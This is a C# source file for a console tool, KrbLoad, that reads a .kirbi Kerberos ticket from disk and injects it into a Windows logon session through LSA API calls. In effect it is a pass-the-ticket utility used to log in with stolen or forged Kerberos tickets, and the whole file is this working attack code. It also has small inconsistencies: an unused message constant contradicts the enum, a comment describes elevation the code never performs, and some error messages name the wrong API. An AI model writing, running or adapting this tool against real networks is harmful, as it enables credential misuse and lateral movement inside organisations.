using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Security.AccessControl;
using System.Globalization;
using Microsoft.Win32;
using System.Security.Principal;
using System.IO;

namespace KrbLoad
{
    class Program
    {
        // Type of Kerberos ticket submission message (KerbSubmitTicketMessage = 10)
        const int KerbSubmitTicketMessage = 10;
        // Flag for ticket injection (0x1 to inject into the current session)
        const int KERB_SUBMIT_TKT_FLAG_USE_LOGON_CRED = 0x1;

        // Declaration of LSA-related APIs
        [DllImport("secur32.dll", SetLastError = false)]
        public static extern int LsaConnectUntrusted(
            [Out] out IntPtr LsaHandle
        );
        
        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_STRING_IN
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public string Buffer;
        }

        [DllImport("secur32.dll", SetLastError = false)]
        public static extern int LsaLookupAuthenticationPackage(
            [In] IntPtr LsaHandle,
            [In] ref LSA_STRING_IN PackageName,
            [Out] out int AuthenticationPackage
        );

        [DllImport("secur32.dll", SetLastError = false)]
        public static extern int LsaCallAuthenticationPackage(
            IntPtr LsaHandle,
            int AuthenticationPackage,
            IntPtr ProtocolSubmitBuffer,
            int SubmitBufferLength,
            out IntPtr ProtocolReturnBuffer,
            out int ReturnBufferLength,
            out int ProtocolStatus
        );

        [DllImport("secur32.dll", SetLastError = false)]
        public static extern uint LsaFreeReturnBuffer(IntPtr Buffer);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern uint LsaNtStatusToWinError(uint Status);

        [DllImport("secur32.dll", SetLastError = false)]
        public static extern int LsaDeregisterLogonProcess(
            [In] IntPtr LsaHandle
        );

        // LSA_STRING structure
        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        public enum KERB_PROTOCOL_MESSAGE_TYPE : UInt32
        {
            KerbDebugRequestMessage = 0,
            KerbQueryTicketCacheMessage = 1,
            KerbChangeMachinePasswordMessage = 2,
            KerbVerifyPacMessage = 3,
            KerbRetrieveTicketMessage = 4,
            KerbUpdateAddressesMessage = 5,
            KerbPurgeTicketCacheMessage = 6,
            KerbChangePasswordMessage = 7,
            KerbRetrieveEncodedTicketMessage = 8,
            KerbDecryptDataMessage = 9,
            KerbAddBindingCacheEntryMessage = 10,
            KerbSetPasswordMessage = 11,
            KerbSetPasswordExMessage = 12,
            KerbVerifyCredentialsMessage = 13,
            KerbQueryTicketCacheExMessage = 14,
            KerbPurgeTicketCacheExMessage = 15,
            KerbRefreshSmartcardCredentialsMessage = 16,
            KerbAddExtraCredentialsMessage = 17,
            KerbQuerySupplementalCredentialsMessage = 18,
            KerbTransferCredentialsMessage = 19,
            KerbQueryTicketCacheEx2Message = 20,
            KerbSubmitTicketMessage = 21,
            KerbAddExtraCredentialsExMessage = 22,
            KerbQueryKdcProxyCacheMessage = 23,
            KerbPurgeKdcProxyCacheMessage = 24,
            KerbQueryTicketCacheEx3Message = 25,
            KerbCleanupMachinePkinitCredsMessage = 26,
            KerbAddBindingCacheEntryExMessage = 27,
            KerbQueryBindingCacheMessage = 28,
            KerbPurgeBindingCacheMessage = 29,
            KerbQueryDomainExtendedPoliciesMessage = 30,
            KerbQueryS4U2ProxyCacheMessage = 31
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_CRYPTO_KEY32
        {
            public int KeyType;
            public int Length;
            public int Offset;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_SUBMIT_TKT_REQUEST
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public LUID LogonId;
            public int Flags;
            public KERB_CRYPTO_KEY32 Key; // key to decrypt KERB_CRED
            public int KerbCredSize;
            public int KerbCredOffset;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public UInt32 LowPart;
            public Int32 HighPart;

            public LUID(UInt64 value)
            {
                LowPart = (UInt32)(value & 0xffffffffL);
                HighPart = (Int32)(value >> 32);
            }

            public LUID(LUID value)
            {
                LowPart = value.LowPart;
                HighPart = value.HighPart;
            }

            public LUID(string value)
            {
                if (System.Text.RegularExpressions.Regex.IsMatch(value, @"^0x[0-9A-Fa-f]+$"))
                {
                    // If the passed LUID string is in the form 0xABC123
                    UInt64 uintVal = Convert.ToUInt64(value, 16);
                    LowPart = (UInt32)(uintVal & 0xffffffffL);
                    HighPart = (Int32)(uintVal >> 32);
                }
                else if (System.Text.RegularExpressions.Regex.IsMatch(value, @"^\d+$"))
                {
                    // If the passed LUID string is in decimal form
                    UInt64 uintVal = UInt64.Parse(value);
                    LowPart = (UInt32)(uintVal & 0xffffffffL);
                    HighPart = (Int32)(uintVal >> 32);
                }
                else
                {
                    System.ArgumentException argEx = new System.ArgumentException("Passed LUID string value is not in a hex or decimal form", value);
                    throw argEx;
                }
            }

            public override int GetHashCode()
            {
                UInt64 Value = ((UInt64)this.HighPart << 32) + this.LowPart;
                return Value.GetHashCode();
            }

            public override bool Equals(object obj)
            {
                return obj is LUID && (((ulong)this) == (LUID)obj);
            }

            public override string ToString()
            {
                UInt64 Value = ((UInt64)this.HighPart << 32) + this.LowPart;
                return String.Format("0x{0:x}", (ulong)Value);
            }

            public static bool operator ==(LUID x, LUID y)
            {
                return (((ulong)x) == ((ulong)y));
            }

            public static bool operator !=(LUID x, LUID y)
            {
                return (((ulong)x) != ((ulong)y));
            }

            public static implicit operator ulong(LUID luid)
            {
                // Enable casting to a ulong
                UInt64 Value = ((UInt64)luid.HighPart << 32);
                return Value + luid.LowPart;
            }
        }

        public static IntPtr GetLsaHandle(bool elevateToSystem = true)
        {
            // Returns a handle to LSA via LsaConnectUntrusted(), elevating to SYSTEM first
            // if we're high integrity so we have trusted access
            IntPtr lsaHandle = IntPtr.Zero;

            LsaConnectUntrusted(out lsaHandle);

            return lsaHandle;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[DEBUG] Program started");
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: KrbLoad.exe <ticket file path>");
                return;
            }

            string ticketPath = args[0];

            LUID logonId = new LUID(); // LowPart=0, HighPart=0

            if (args.Length == 2) {
                logonId = new LUID(args[1]);
            }

            Console.WriteLine("[DEBUG] Ticket file path: " + ticketPath);
            if (!File.Exists(ticketPath))
            {
                Console.WriteLine("[DEBUG] The specified ticket file was not found: " + ticketPath);
                return;
            }

            // Read the ticket file (binary file in .kirbi format)
            byte[] ticketData = File.ReadAllBytes(ticketPath);
            Console.WriteLine("[DEBUG] Ticket data size: " + ticketData.Length + " bytes");


            Console.WriteLine("[DEBUG] Using LogonId: LowPart = {0}, HighPart = {1}", logonId.LowPart, logonId.HighPart);

            var lsaHandle = GetLsaHandle();
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;

            var inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;

            try
            {
                LSA_STRING_IN LSAString;
                var Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;
                ntstatus = LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                {
                    var winError = LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }

                var requestK = new KERB_SUBMIT_TKT_REQUEST();
                requestK.MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;
                requestK.KerbCredSize = ticketData.Length;
                requestK.KerbCredOffset = Marshal.SizeOf(typeof(KERB_SUBMIT_TKT_REQUEST));

                if ((ulong)logonId != 0)
                {
                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)logonId);
                    requestK.LogonId = logonId;
                }
                

                var inputBufferSize = Marshal.SizeOf(typeof(KERB_SUBMIT_TKT_REQUEST)) + ticketData.Length;
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(requestK, inputBuffer, false);
                Marshal.Copy(ticketData, 0, new IntPtr(inputBuffer.ToInt64() + requestK.KerbCredOffset), ticketData.Length);
                ntstatus = LsaCallAuthenticationPackage(lsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);

                if (ntstatus != 0)
                {
                    var winErrorK = LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winErrorK).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winErrorK, errorMessage);
                    return;
                }
                if (ProtocalStatus != 0)
                {
                    var winErrorK = LsaNtStatusToWinError((uint)ProtocalStatus);
                    var errorMessage = new Win32Exception((int)winErrorK).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocalStatus): {1}", winErrorK, errorMessage);
                    return;
                }
                Console.WriteLine("[+] Ticket successfully imported!");

            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);

                LsaDeregisterLogonProcess(lsaHandle);

            }
        }
    }
}
